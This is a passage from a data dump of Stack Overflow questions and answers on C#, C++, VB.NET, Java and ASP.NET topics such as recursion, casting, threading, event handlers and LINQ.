                           &lt;Task&gt;
                               &lt;ID&gt;&lt;%= idx + 1 %&gt;&lt;/ID&gt;                               
                           &lt;/Task&gt; _
                           ) %&gt;
                   &lt;/Tasks&gt;
</code></pre>
"
"<p>I have an ArrayList that contains Strings and also contains other ArrayLists which may contain Strings or even more ArrayLists.</p>

<p>Is there a simple way to extract all the Strings from this multilevel ArrayList?</p>

<p>I'm assuming some recursion is invloved but I haven't been able to get it to work.</p>
","33708","","<pre><code>public static ArrayList FlattenList(ArrayList list) {
   ArrayList l = new ArrayList(); 
   FillList(list, l);
   return l;
}
private static void FillList(ArrayList source, ArrayList listToFill) {
   foreach (object o in source) {
      ArrayList l = o as ArrayList;
      if (l != null)
          FillList(l, listToFill);
      else
          listToFill.Add(o);
   }
}
</code></pre>
"
"<p>I am a newbie to C++/CLI and is having some problems trying to override the Equal method of the base Object class. I get the following compilation warning error for the following code. How should this be corrected?</p>

<pre><code>Warning 1   warning C4490: 'override' : incorrect use of override specifier; 'Test::Sample::Equal' does not match a base ref class method   c:\project\code\Sample.h    18  

Error   2   error LNK2022: metadata operation failed (80131187) : Inconsistent method declarations in duplicated types (types: Test.Sample; methods: Equal): (0x06000002).  Sample.obj
</code></pre>

<p>Edit 3: I changed ""Equal"" to ""Equals"", removed override keyword in source file but error 2 still stands.</p>

<p><b>// Header File</b></p>

<pre><code>public ref class Sample : public Object
{
    public:
        int someVariable;

    virtual bool Equals(Object^ obj) override;
    virtual int GetHashCode() override;
}
</code></pre>

<p><b>// Source File</b></p>

<pre><code>bool Sample::Equals(Object^ obj)
{ 
    if ( obj == nullptr || GetType() != obj-&gt;GetType() )
        return false;

    Sample^ p = dynamic_cast&lt;Sample^&gt;(obj);
    return (someVariable == p-&gt;someVariable);
}

int Sample::GetHashCode()
{
    return GetHashCode();
}
</code></pre>
","33708","","<p>The name of the method is not <code>Equal</code>, it's <code>Equals</code>. You shouldn't use <code>virtual</code> or <code>override</code> keywords in the implementation:</p>

<pre><code>ref class Test {
public:
    virtual bool Equals(Object^ o) override; 
    virtual int GetHashCode() override;

};
bool Test::Equals(Object^ o) { // no ""override"" here 
    //...
}
int Test::GetHashCode() { // no ""override"" here
    //...
}
</code></pre>
"
"<p>I need to increase session timeout of my web use form ...</p>

<p>could anyone please help ?</p>
","33708","","<p>In Web.config:</p>

<pre><code>&lt;system.web&gt;
  ...
  &lt;sessionState timeout=""timeout in minutes""
       ...
  /&gt;
  ...
&lt;/system.web&gt;
</code></pre>
"
"<p>Is it possible to create a ""catchall"" getter property in C#?</p>

<pre><code>class xyzFactory {

   public static object this.*(string name){
       get { return new name();}
  }
}
</code></pre>

<p>In PHP you would write something like </p>

<pre><code>//static getters are new to 5.3, so I didn't put it here.

class xyzFactory{
    public _get($name){ return $name();}
}
</code></pre>
","33708","","<p>No, you can't do that in C#.  C# is a compiled language and statically resolves method slots at compile time. It doesn't support passing the property name as string or things like that.</p>
"
"<p>I need to convert an integral type which contains an address to the actual pointer type. I could use reinterpret_cast as follows:</p>

<pre><code>MyClass *mc1 = reinterpret_cast&lt;MyClass*&gt;(the_integer);
</code></pre>

<p>However, this does not perform any run-time checks to see if the address in question actually holds a MyClass object. I want to know if there is any benefit in first converting to a void* (using reinterpret_cast) and then using dynamic_cast on the result. Like this:</p>

<pre><code>void *p = reinterpret_cast&lt;void*&gt;(the_integer);
MyClass *mc1 = dynamic_cast&lt;MyClass*&gt;(p);
assert(mc1 != NULL);
</code></pre>

<p>Is there any advantage in using the second method?</p>
","33708","","<p>No, there's no specific advantage in doing so. The moment you use <code>reinterpret_cast</code>, all bets are off. It's up to you to be sure the cast is valid.</p>
"
"<p>I inherited KryptonToolkit ListBox control to get SelectedItemChanging event.</p>

<pre><code>public class CPListBox : KryptonListBox
{		
	public event CancelEventHandler SelectedIndexChanging;

	protected virtual void OnSelectedIndexChanging(CancelEventArgs e)
	{
		SelectedIndexChanging(this, e);
	}

	protected override void OnSelectedIndexChanged(EventArgs e)
	{			
		CancelEventArgs cArgs = new CancelEventArgs();
		OnSelectedIndexChanged(cArgs);

		if(!cArgs.Cancel)
		{
			base.OnSelectedIndexChanged(e);
		}
	}
}
</code></pre>

<p>In form I handle event with code: </p>

<pre><code>    void UsersListBoxSelectedIndexChanging(object sender, CancelEventArgs e)
	{
		if(_presenter.CurrentUser.IsModified)
		{
			MessageBox.Show(""Nie zapisales zmian!"");
			e.Cancel = true;
		}

	}
</code></pre>

<p>And I got stackOverflow ;) Exception. Maybe someone now what is wron with this code?</p>
","33708","","<p>You're recursively calling the method in itself forever. There's no terminating condition for these recursive calls. It'll result in Stack Overflow.</p>

<pre><code>protected override void OnSelectedIndexChanged(EventArgs e)
{                       
       CancelEventArgs cArgs = new CancelEventArgs();
       OnSelectedIndexChanged(cArgs); // Clearly calling yourself indefinitely.
       //...
}
</code></pre>
"
"<p>I have a process that takes a long time, and I want a window to show the progress.  But, I can't figure how to display the progress.</p>

<p>Here's the code:</p>

<pre><code>if (procced)
{
    // the wpf windows :
    myLectureFichierEnCour = new LectureFichierEnCour(_myTandemLTEclass);
    myLectureFichierEnCour.Show();

    bgw = new BackgroundWorker();
    bgw.DoWork += startThreadProcessDataFromFileAndPutInDataSet;
    bgw.RunWorkerCompleted += threadProcessDataFromFileAndPutInDataSetCompleted;

    bgw.RunWorkerAsync();
}
</code></pre>

<p>And:</p>

<pre><code>private void startThreadProcessDataFromFileAndPutInDataSet(object sender, DoWorkEventArgs e)
{
    _myTandemLTEclass.processDataFromFileAndPutInDataSet(
        _strCompositeKey,_strHourToSecondConversion,_strDateField);
}
</code></pre>

<p>I can call <code>_myTandemLTEclass.processProgress</code> to get a hint of the progress.</p>
","33708","","<p>You should handle the <code>ProgressChanged</code> event and update the progress bar in your user interface there.</p>

<p>In the actual function that does the work (<code>DoWork</code> event handler), you'll call the <code>ReportProgress</code> method of the <code>BackgroundWorker</code> instance with an argument specifying the amount of task completed. </p>

<p>The <a href=""http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx"" rel=""nofollow"">BackgroundWorker example in MSDN Library</a> is a simple code snippet that does the job.</p>
"
"<p><em>Without any code in the subclasses</em>, I'd like an abstract class to have a different copy of a static variable for each subclass. In C#</p>

<pre><code>abstract class ClassA
{
    static string theValue;

    // just to demonstrate
    public string GetValue()
    {
        return theValue;
    }
    ...
}
class ClassB : ClassA { }
class ClassC : ClassA { }
</code></pre>

<p>and (for example):</p>

<pre><code>(new ClassB()).GetValue(); // returns ""Banana""
(new ClassC()).GetValue(); // returns ""Coconut""
</code></pre>

<p>My current solution is this:</p>

<pre><code>abstract class ClassA
{
    static Dictionary&lt;Type, string&gt; theValue;
    public string GetValue()
    {
        return theValue[this.GetType()];
    }
    ...
}
</code></pre>

<p>While this works fine, I'm wondering if there's a more elegant or built-in way of doing this?</p>

<p><em>This is similar to <a href=""http://stackoverflow.com/questions/1448092/"" title=""Can I have different copies of a static variable for each different type of inheriting class"">Can I have different copies of a static variable for each different type of inheriting class</a>, but I have no control over the subclasses</em></p>
","33708","","<p>There's an alternative solution which might or might not be better than yours, depending on the use case:</p>

<pre><code>abstract class ClassA
{
    private static class InternalClass&lt;T&gt; {
        public static string Value;
    }
    public string GetValue()
    {
        return (string)typeof(InternalClass&lt;&gt;)
              .MakeGenericType(GetType())
              .GetField(""Value"", BindingFlags.Public | BindingFlags.Static)
              .GetValue(null);
    }
}
</code></pre>

<p>This approach is used in <code>EqualityComparer&lt;T&gt;.Default</code>. Of course, it's not used for this problem. You should really consider making <code>GetValue</code> abstract and override it in each derived class.</p>
"
"<p>I'm using C# .NET 3.5 ... and I've been working to decouple a BLL object by moving database related activity into a seperate worker object. The worker object adds entities to the database and events a success or failure message back to a BLL object.  </p>

<p>When I instance the worker object in the BLL I wire up the worker's events and set the BLL's event handler using the event += delegate(eventhandler) syntax. </p>

<p>I've heard that if I don't explicitly unwire the listeners with the -= syntax when the worker is disposed that there is a potential for memory leaks.</p>

<p>All of this processing occurs in a windows service that picks up messages from a queue and calls the appropriate BLL object ... I'm worried that I might be introduce a memory leak into this process.</p>
","33708","","<p>What you heard is true. As long as your object is subscribed to an event from another reachable object, the runtime will not release the subscriber object. If your application creates one or a small set of worker objects at the beginning for its lifetime, then you should be OK. If the application creates a worker object for each BLL object but the reference to BLL instance is released, you should be OK too.</p>

<p>The dangerous thing is to <em>blindly</em> subscribe an instance method to a <code>static</code> event or an instance event of an object with a long lifetime.</p>
"
"<p>This I can't work out</p>

<p>I have ASP.Net user control,which is basically two drop downs, that has a public property Index which is calculated from the drop downs, and works fine</p>

<p>I need to access the value of 'Index' from javascript, but accessing via getElementById was completely wrong, can anybody point me in a better direction</p>

<p>Cheers</p>
","33708","","<p>The property you're talking about is a server side thing and has no presence in Javascript. Basically, whatever ASP.NET does on the server will generate a single HTML page containing a bunch of HTML tags. The browser is not aware of the user control being a single entity at all.</p>

<p>You should calculate the property on the client by looking up the ID of the drop down directly in Javascript. You can do find out the client ID of the drop down by getting its <code>ClientID</code> property.</p>
"
"<p>Is std::list thread safe? I'm assuming its not so I added my own synchronization mechanisms (I think i have the right term). But I am still running into problems </p>

<p>Each function is called by a separate thread. Thread1 can not wait, it has to be as fast as possible </p>

<pre><code>std::list&lt;CFoo&gt; g_buffer; 
bool g_buffer_lock; 

void thread1( CFoo frame ) {
    g_buffer_lock = true ; 
    g_buffer.push_back( frame ) ; 
    g_buffer_lock = false; 
}


void thread2( )
{
    while( g_buffer_lock ) {
    	// Wait 
    }

    // CMSTP_Send_Frame * pMSTPFrame = NULL ; 
    while ( ! g_buffer_lock &amp;&amp; g_buffer.size() &gt; 0 )
    {
    	// Get the top item 
    	CFoo&amp; pFoo = g_buffer.front() ;

    	// Do something. 

    	// remove the front item 
    	g_buffer.pop_front();
    }
}
</code></pre>

<p>After about 170k calls to thread1 and 900k calls to thread2 I get an exception error on <code>CFoo&amp; pFoo = g_buffer.front() ;</code> </p>

<p>That causes the program to crash. stdthrow.cpp: 22 </p>

<pre><code>#ifdef _DEBUG
_CRTIMP2_PURE void __CLRCALL_PURE_OR_CDECL _Debug_message(const wchar_t *message, const wchar_t *file, unsigned int line)
    {	// report error and die
        if(::_CrtDbgReportW(_CRT_ASSERT, file, line, NULL, message)==1)
        {
            ::_CrtDbgBreak();
        }
    }
_CRTIMP2_PURE void __CLRCALL_PURE_OR_CDECL _Debug_message(const unsigned short *message, const unsigned short *file, unsigned int line)
    {	// report error and die
        _Debug_message((wchar_t *) message, (wchar_t *) file, line);
    }

#endif
</code></pre>

<p>Suggestions, comments, is there a better way of doing things? </p>
","33708","","<p>No, it's not guaranteed to be thread safe.</p>

<p>Your synchronization mechanism is flawed. You are allowing <code>thread1</code> to change the list while <code>thread2</code> is working with it. This can cause problems. Besides that, you should make your lock variable <code>volatile</code>.</p>
"
"<p>I have a bunch of stored, serialized classes (that all inherit from a base class) in C#.  Along with the serialized class, I also store an enum value that identifies the which subclass is serialized.</p>

<p>This means that whenever I want to serialize/deserialize the class, I've got to use a couple of big switch statements based on the enum to decide which subclass to deserialize into.  It seems like there would be a be a way to do it using some kind of structuremap-like thing. (Its for a widget/dashboard, so its completely possible that many more subclasses will appear in the future).</p>

<p>Right now, It looks like this...</p>

<pre><code> widget = DeserializeFromDb(GetWidgetType(widgetrow.WidgetType),  widgetRow.serializedWidget);

   private HtmlWidget DeserializeFromDb(WidgetType type, string serialized)
   {
        Basics.Serial.IStringSerializer serializer = Basics.Serial.BinarySerializer.GetInstance();

        switch (type)
        {
            case WidgetType.AbstractBase:
                return serializer.Deserialize&lt;HtmlWidget&gt;(serialized);
                break;
            case WidgetType.Widget1:
                return serializer.Deserialize&lt;Widget1&gt;(serialized);
                break;
            case WidgetType.Widget2:
                return serializer.Deserialize&lt;Widget2&gt;(serialized);
                break;
       }
  }
</code></pre>
","33708","","<p>You can map enum values to <code>Func&lt;ISerializer, string, HtmlWidget&gt;</code> delegates:</p>

<pre><code>static Dictionary&lt;WidgetType, Func&lt;ISerializer, string, HtmlWidget&gt;&gt; map = 
   new Dictionary&lt;WidgetType, Func&lt;ISerializer, string, HtmlWidget&gt;&gt; {
      { WidgetType.AbstractBase, (s, o) =&gt; s.Deserialize&lt;HtmlWidget&gt;(o) },
      { WidgetType.Widget1, (s, o) =&gt; s.Deserialize&lt;Widget1&gt;(o) }, 
   // ...
};

// use it like:
return map[type](serializer, serialized);
</code></pre>
"
"<p>We meet a testing scenario which needs to tamper with source IP address of a Http request to simulate <strong>clients coming from different countries</strong>. Do you know any tool help on this?</p>

<p>Last but not least, our web site is built with ASP.NET.</p>

<p>Thanks.</p>
","33708","","<p>As noted in answers to the <a href=""http://serverfault.com/questions/90725/are-ip-addresses-trivial-to-forge"">ServerFault question ""Are IP addresses trivial to forge""</a>, you cannot easily forge source addresses in a protocol that required two way communication (e.g. TCP). Note that this ""two way communication"" is required at the packet level. You cannot just say ""no problem, I want to send requests and ignore HTTP responses."" To establish a TCP session, you need to receive data. Your best bet is to use a proxy server.</p>
"
"<p>Curious about things to consider to avoid any code breaks, etc to upgrade from .NET 3.5 to 4.</p>

<p>I am particularly interested in:
- What would be the server requirements to deploy a .NET 4 app? Does it need any particular version of IIS and Windows Server to run?</p>

<p>I am facing serious performance issues with Entity Framework due to the large size of database and initialization takes long time for the first user to login. .NET 4 seems to realize this as a widespread issue and has something called PreWarm apps. Scottgu's post <a href=""http://weblogs.asp.net/scottgu/archive/2009/09/15/auto-start-asp-net-applications-vs-2010-and-net-4-0-series.aspx"" rel=""nofollow"">here</a> seems to talk more about it. But, curious if this will work on IIS 6 and WinServer 2003.</p>

<p>Are there any other things i need to think of before making the switch to .NET 4?</p>
","33708","","<p>.NET Framework 4 Beta 2 can be installed on Windows Server 2003. The <a href=""http://www.microsoft.com/downloads/details.aspx?familyid=DED875C8-FE5E-4CC9-B973-2171B61FE982&amp;displaylang=en"" rel=""nofollow"">software requirements</a> are:</p>

<blockquote>
  <p><strong>Supported Operating Systems:</strong> Windows
  Server 2003; Windows Server 2008;
  Windows Vista; Windows XP  </p>
  
  <p>.NET Framework 4 can be installed on the
  following operating systems:<br>
  - Windows XP SP3<br>
  - Windows Server 2003 SP2<br>
  - Windows Vista SP1<br>
  - Windows 7<br>
  - Windows Server 2008 (not supported on Server Core Role)<br>
   - Windows Server 2008 R2 (not supported on Server Core Role)
  Note that .NET Framework 4 is currently in Beta. If you have a working app on production, you might want to consider waiting for its RTM.</p>
</blockquote>
"
"<p>I'm writing a function that takes an <code>Enum</code> and casts it to <code>uint</code>. From what I've seen when casting to <code>int</code>, you have to cast it to an object first: <code>(int) (object) myEnumValue</code>. If you write <code>(int) myEnumValue</code> you get a compile time exception. </p>

<p>Now, when I tried to cast it to uint, I was expecting that <code>(uint) (object) myEnumValue</code> would be alright. It compiles nicely, but when run, it generates an <code>InvalidCastException</code>. So to get it to work, I've used</p>

<pre><code>(uint) (int) (object) myEnumValue
</code></pre>

<p>I think it looks funny, so I'm quite happy, but why is it so?</p>

<p>Maybe it would have been more correct to ask why it is not possible to cast <code>object</code> to <code>uint</code>, but I'm interested in whether there is another way to go from an <code>Enum</code> to <code>uint</code>. Is there?</p>

<p><b>Edit:</b></p>

<p>The context is a function, something like this: </p>

<pre><code>public static uint ToUInt (Enum e)
{
    return (uint) (int) (object) e;
}
</code></pre>

<p><b>Edit 2:</b></p>

<p>The best solution was as mentioned by thecoop:</p>

<pre><code>Convert.ToUInt32(e)
</code></pre>
","33708","","<blockquote>
  <p>From what I've seen when casting to int, you have to cast it to an object first: <code>(int) (object) myEnum</code>. If you write <code>(int) myEnum</code> you get a compile time exception.</p>
</blockquote>

<p>Not true. You can directly cast an enum value to an integer type.</p>

<blockquote>
  <p>Now, when I tried to cast it to uint, I was expecting that (uint) (object) myEnum would be alright. It compiles nicely, but when run, it generates an InvalidCastException. So to get it to work, I've used: 
         <code>(uint) (int) (object) myEnum</code><br>
  I think it looks funny, so I'm quite happy, but why is it so?</p>
</blockquote>

<p>When you cast an enum value to <code>object</code>, it'll be boxed as its <em>underlying type</em>, which is <code>int</code> by default. You cannot unbox a boxed value to any type other than its actual type directly. Even this will fail:</p>

<pre><code>short s = 10;
object o = s;
int i = (int)o; // throws `InvalidCastException` while `int i = (int)s;` works.
</code></pre>
"
"<p>Best way to illustrate my question is with this example code:</p>

<pre><code>  class Item {}
  class Container&lt; T &gt; {}
  class Program
  {
    static void DoSomething( object something )
    {
      if( typeof( Item ) == something.GetType() )
      {
        System.Console.WriteLine( ""Item"" );
      }
      else if( typeof( Container&lt;&gt; ) == something.GetType() )
      {
        System.Console.WriteLine( ""Container&lt;&gt;"" );
      }
    }

    static void Main( string[] args )
    {
      DoSomething( new Item() );
      DoSomething( new Container&lt; int &gt;() );
    }
  }
</code></pre>

<p>The following line will not work:</p>

<pre><code>else if( typeof( Container&lt;&gt; ) == something.GetType() )
</code></pre>

<p>Is it a way to make it work without explicitly changing <code>Container&lt;&gt;</code> into <code>Container&lt;int&gt;</code>? I want to know that object is of 'Container' type and I really has no interest is it <code>Container&lt;int&gt;</code> or <code>Container&lt;string&gt;</code>. Any hints other than dozens lines of reflection?</p>
","33708","","<p>Try:</p>

<pre><code>typeof(Container&lt;&gt;) == something.GetType().GetGenericTypeDefinition()
</code></pre>

<p>Note that this will only return true if the actual type is <code>Container&lt;T&gt;</code>. It doesn't work for derived types. For instance, it'll return <code>false</code> for the following:</p>

<pre><code>class StringContainer : Container&lt;string&gt;
</code></pre>

<p>If you need to make it work for this case, you should traverse the inheritance hierarchy and test each base class for being <code>Container&lt;T&gt;</code>:</p>

<pre><code>static bool IsGenericTypeOf(Type genericType, Type someType)
{   
  if (someType.IsGenericType 
          &amp;&amp; genericType == someType.GetGenericTypeDefinition()) return true;

  return someType.BaseType != null 
          &amp;&amp; IsGenericTypeOf(genericType, someType.BaseType);
}
</code></pre>
"
"<p>Hey guys, just starting out with C#. I had a few doubts, would really appreciate it if anyone could help me out here.</p>

<p><hr></p>

<h2>Question 1</h2>

<pre><code>   namespace borrowmoney
    {
        public partial class Form1 : Form
        {
            guy nikhil = new guy();

             public Form1()
            {
                InitializeComponent();


                nikhil.cash=50;
             }
          }
    }
</code></pre>

<p>here in the above program form1() constructor should run first but the instantiation is done outside the constructor so how would the constructor come to know about the instantiation and in return use guy's data members(cash is a data member of of guy class ) ?</p>
","33708","","<p>When the code is compiled, the instantiation will be moved to the constructor. It will be instantiated before the body of your constructor is executed.</p>
"
"<p>Is there a way to do this:</p>

<pre><code>this.logFile = File.Open(""what_r_u_doing.log"", FileMode.OpenOrCreate, FileAccess.ReadWrite);

using(var sr = new StreamReader(this.logFile))
{
    // Read the data in
}

// ... later on in the class ...

this.logFile = File.Open(""what_r_u_doing.log"", FileMode.OpenOrCreate, FileAccess.ReadWrite);

using(var sw = new StreamWriter(this.logFile))
{
    // Write additional data out...
}
</code></pre>

<p>Without having to open the file twice?</p>

<p>I can't seem to make the StreamReader not-dispose my stream.  I don't want to just let it go out of scope, either.  Then the garbage collector will eventually call the Dispose, killing the stream.</p>
","33708","","<blockquote>
  <p>I don't want to just let it go out of scope, either. Then the garbage collector will eventually call the Dispose, killing the stream.</p>
</blockquote>

<p>Garbage collector will call the <code>Finalize</code> method (destructor), not the <code>Dispose</code> method. The finalizer will call <code>Dispose(false)</code> which will <strong>not</strong> dispose the underlying stream. You should be OK by leaving the <code>StreamReader</code> go out of scope if you need to use the underlying stream directly. Just make sure you dispose the underlying stream manually when it's appropriate.</p>
"
"<p>I have a resultset class:</p>

<pre><code>Public Class AResultSet
    Implements IEnumerable(Of ConcreteResult)

    Private _list As List(Of ConcreteResult)

    Public Sub New()
        _list = New List(Of ConcreteResult)
    End Sub

    Public Function GetEnumerator() As System.Collections.Generic.IEnumerator(Of ConcreteResult) Implements System.Collections.Generic.IEnumerable(Of ConcreteResult).GetEnumerator
        Return _list.GetEnumerator
    End Function

    Public Function GetEnumerator1() As System.Collections.IEnumerator Implements System.Collections.IEnumerable.GetEnumerator
        Return _list.GetEnumerator
    End Function
End Class
</code></pre>

<p>and a linq query:</p>

<pre><code>Dim res As AResultSet = (From pk In testPackages, _
         pp In pk.PackagePriceCollection _
          Select New ConcreteResult(pk, pp))
</code></pre>

<p>But I get a cast error. So if I change the</p>

<pre><code>Dim res As AResultSet
</code></pre>

<p>To:</p>

<pre><code>Dim res As IEnumerable(Of ConcreteResult)
</code></pre>

<p>It works. But I want to cast the linq query result to the type AResultSet, which is also  an IEnumerable(Of ConrecteResult).</p>

<p>Or am I doing something wrong here?</p>
","33708","","<p>While it's unclear to me why you might want to create a class to duplicate the functionality of <code>List(Of T)</code>, what you are trying to do is not directly possible. You should either create an implicit (<code>Widening</code>) user defined cast operator in your class or create a constructor that takes an <code>IEnumerable(Of ConcreteResult)</code> and uses that to fill the private list field.</p>

<pre><code>Public Class AResultSet
      Implements IEnumerable(Of ConcreteResult)
   Private list As List(Of ConcreteResult)
   Private Sub New(l As List(Of ConcreteResult))
      list = l
   End Sub
   Public Shared Widening Operator CType(seq As IEnumerable(Of ConcreteResult)) As AResultSet
      Return New AResultset(seq.ToList())
   End Sub
   ...
End Class
</code></pre>
"
"<p>Have you ever restricted yourself to using a subset of language features, and more importantly, why?</p>

<p>I'm curious to find out who choose to use only certain language features and avoid others in order to win big in areas such as, but not limited to, memory usage, execution speed or plain old readability and maintainability. And by doing so did it yield the expected results or did it perhaps just hamper some other aspect of producing software. Are there any cautionary tales or wild success stories out there worth sharing regarding this subject?</p>
","33708","","<p>One case is when you're writing a compiler of a new language in itself. You can:</p>

<ul>
<li>Use another language to write a simple compiler for a subset of the new language.</li>
<li>Use that subset of the new language to write the compiler for the complete version of itself.</li>
</ul>
"
"<p>Can anyone please tell me how to multiply two number arrays in C? The number arrays are basically derived from two strings containing digits. eg: 123456 and 132465.</p>

<p>Edit: I had two string as <code>S1 = ""123456""</code> and <code>S2=""132546""</code>. I then converted these two strings into array of ints i.e. int IS1[6] and IS2[6] so that </p>

<pre><code>IS1[1] = 1, IS1[2] = 2......
</code></pre>

<p>and</p>

<pre><code>IS2[1] = 1, IS2[2] = 3.....
</code></pre>

<p>Now I have to mulitply these two arrrays. Please help.</p>
","33708","","<p>It's not clear what exactly you want to multiply. If you need to multiply two null terminated strings in a <code>char[]</code>, you can convert them to <code>int</code> values with <code>atoi</code>:</p>

<pre><code>int result = atoi(str1) * atoi(str2);
</code></pre>
"
"<p>Studing STL I have written a a simple program to test functors and modifiers. My question is about the difference aon using CLASS or STRUCT to write a functor and try to operate on it with function adaptors.
As far as I understand in C++ the difference beetween CLASS and STRUCT is that in the last case the members are public by default. This is also what I read many times in the answers in this site. So please explain me why this short piece of code will fail to compile even if I declared all members ( just a function overloading () ) public when I try to use the not2 modifier. (I have not tried other modifiers e.g. binders yet)</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;functional&gt;
#include &lt;algorithm&gt;
using namespace std;

template &lt;class T&gt;
void print  (T  i) {
    cout &lt;&lt; "" "" &lt;&lt; i;
}
// In the manual I read:
// ""In C++, a structure is the same as a class except that its members are public by default.""
//  So if I declare all members public it should work....

template &lt;class T&gt;
class mystruct : binary_function&lt;T ,T ,bool&gt; {
    public :
    bool operator() (T  i,T  j) const { return i&lt;j; }
};

template &lt;class T&gt;
class generatore 
{
public:
    generatore (T  start = 0, T  stp = 1) : current(start), step(stp)
    { }
    T  operator() () { return current+=step; }
private:
    T  current;
    T  step;
};

int main () {
    vector&lt;int&gt; first(10);
    generate(first.begin(), first.end(), generatore&lt;int&gt;(10,10) );
    first.resize(first.size()*2);
    generate(first.begin()+first.size()/2, first.end(), generatore&lt;int&gt;(1,17) );
    cout &lt;&lt; ""\nfirst :"";
    for_each (first.begin(), first.end(), print&lt;int&gt;);
    cout &lt;&lt; ""\nFORWARD SORT :"";
    sort(first.begin(),first.end(),mystruct&lt;int&gt;());       // OK ! even with CLASS
    for_each (first.begin(), first.end(), print&lt;int&gt;);
    sort(first.begin(),first.end(),not2(mystruct&lt;int&gt;())); // &lt;--- THIS LINE WILL NOT COMPILE IF I USE CLASS INSTEAD OF STRUCT
    cout &lt;&lt; ""\nBACKWARD SORT :"";
    for_each (first.begin(), first.end(), print&lt;int&gt;);
    cout &lt;&lt; endl;
}
</code></pre>

<p>Everithing runs as expected if I use:</p>

<pre><code>struct  mystruct : binary_function&lt;T ,T ,bool&gt; {
    public :
    bool operator() (T  i,T  j) const { return i&lt;j; }
};
</code></pre>

<p>Part of the error message I obtain is:</p>

<blockquote>
  <p>g++  struct.cpp<br>
  /usr/include/c++/4.2.1/bits/stl_function.h:<br>
  In instantiation of
  âstd::binary_negate >â:<br>
  struct.cpp:52:   instantiated from
  here<br>
  /usr/include/c++/4.2.1/bits/stl_function.h:116:<br>
  error: âtypedef int
  std::binary_function::first_argument_typeâ is
  inaccessible<br>
  /usr/include/c++/4.2.1/bits/stl_function.h:338:<br>
  error: within this context<br>
  /usr/include/c++/4.2.1/bits/stl_function.h:119:<br>
  error: âtypedef int
  std::binary_function::second_argument_typeâ is
  inaccessible ....  </p>
</blockquote>

<p>Seems that at least in this case a struct is not equivalent to a class with public members, but why ?</p>
","33708","","<p>The difference you read from other answers is correct. <code>struct</code> is just a <code>class</code> with <code>public</code> accessibility by default. This includes the <em>inheritance modifier</em>. Basically, you should mention <code>public</code> before the base class name when you're using a <code>class</code> to make those definitions equivalent:</p>

<pre><code>template &lt;class T&gt;
class mystruct : public binary_function&lt;T ,T ,bool&gt; {
    public:
    bool operator() (T  i,T  j) const { return i&lt;j; }
};
</code></pre>

<p>Otherwise, the compiler will assume that <code>mystruct</code> is privately inheriting <code>binary_function&lt;T,T,bool&gt;</code>.</p>

<p>You can verify this fact by changing the <code>struct</code> to:</p>

<pre><code>struct  mystruct : private binary_function&lt;T ,T ,bool&gt; {
    public: // not required here
    bool operator() (T  i,T  j) const { return i&lt;j; }
};
</code></pre>

<p>which is equivalent to your current definition of the <code>class</code> and see the compiler whine with a similar error message.</p>
"
"<p>I am working on files and folder ....How i can get the creation time of the file folder even millisecond bcoz i am facing files folder created on same second..i am able to get hr:min:sec but getting millisecond as zero when i use Fileinfo or Directoryinfo.creationtime.millisecond.....
           Plz how can i overcome this problem
thanks in advance</p>
","33708","","<p>It's likely that your filesystem does not store creation date that precise.</p>
"
"<p>I did a fair bit of searching for an answer to this question, but no example that I could find got all the way to where I need to be.</p>

<p>I've got a <code>Dictionary(Of SomeEnum, Integer)</code> that gets filled up while looping through some objects that have a property with type <code>SomeEnum</code>. Once the loop is done, I want the <code>SomeEnum</code> type that occurs the most in the list of objects. I also need the other counts as well for display purposes, hence the usage of a simple <code>Dictionary(Of K, V)</code>.</p>

<p>I am looking for a LINQ query to give me back the <code>SomeEnum</code> key that occurs the most by looking at each keys number of occurences. Or perhaps there's an easier way of going about it.</p>

<p>I could do this:</p>

<pre><code>    Return (From kvp As KeyValuePair(Of SomeEnum, Integer) _
            In Me.MyObjects Order By kvp.Value Descending _
            Select kvp).First().Key
</code></pre>

<p>But wouldn't the sorting be a more expensive operation than trying to wiggle Max() in there somehow? I'm a LINQ n00b, so any feedback would be greatly appreciated.</p>
","33708","","<p>You can use the <code>MaxBy</code> method in <a href=""http://code.google.com/p/morelinq"" rel=""nofollow"">MoreLINQ</a>. There's a <a href=""http://stackoverflow.com/questions/1101841/linq-how-to-perform-max-on-a-property-of-all-objects-in-a-collection-and-retu"">similar question</a> already on StackOverflow (it's in C#, though). You can use it like:</p>

<pre><code>Return dic.MaxBy(Function(pair) pair.Value).Key
</code></pre>
"
"<p>It seems async HTTP handler would scale better than synchronous HTTP handler. But then can a .aspx page be handled by a async handler? If so, how? or does some one need to implement the same using ajax only?</p>
","33708","","<p>Async HTTP Handlers can help scalability when you have relatively long running I/O-bound tasks (fetch something from network, disk, database, Web service, ...) and you don't want to have your thread pool threads blocked while they are waiting for those tasks to finish. In other cases, they won't help. They don't magically make your application faster. You create async handlers by implementing the <code>IHttpAsyncHandler</code> interface.</p>
"
"<p>How do I block a function call in C#?</p>

<p>This function gets repeatedly called by different classes.I want to lock it up so that no one else can use it until I perform my current operation. Then,i want to release it again.</p>

<p>Please help..</p>

<p>Thanks</p>

<p>Edit:I'm not actually using threads...but I am using timers that call the function repeatedly and it's also called among different classes.</p>
","33708","","<p>Use a <code>lock</code>:</p>

<pre><code>private static object lockObject = new object();

lock(lockObject) {
  // ... code goes here...
}
</code></pre>
"
"<p>Given this code: </p>

<pre><code>public class Messager implements Runnable {            

  public static void main(String[] args) {   
      new Thread(new Messager(""Wallace"")).start();    
      new Thread(new Messager(""Gromit"")).start();             
  }             
  private String name;                 
  public Messager(String name) { this.name = name; }             
  public void run() {    
      message(1); message(2);    
  }           
  private synchronized void message(int n) {    
    System.out.print(name + ""-"" + n + "" "");    
  }    
}
</code></pre>

<p>I understand that the <code>synchronized</code> keyword makes the thread dependent on the object's lock. Questions:</p>

<p>a) Is the lock released as soon as the method marked as <code>synchronized</code> finishes? Or as soon as the thread's <code>run()</code> method finishes
b) Can I ensure that any one of the threads will print its name and <code>1 2</code> before the other?</p>
","33708","","<p>A. Yes. It's released as soon as the <code>synchronized</code> function finishes.<br>
B. Yes. You can, but if you wanted to do so, why would you write multithreaded code in the first place? <code>synchronized</code> guarantees atomicity, not anything regarding the order, but you can enforce order by waiting for a flag to change. Anyway, what you are trying to enforce is <strong>sequentiality</strong>. You get this for free in single-threaded environments :)</p>
"
"<p>microsoft visual studio opens my table using dataset designer<br>
but i cannot open my table using the same connectionstring.<br>
my database is DBase IV.<br>
and this is the connectionstring </p>

<blockquote>
  <p>Driver={Microsoft dBASE Driver 
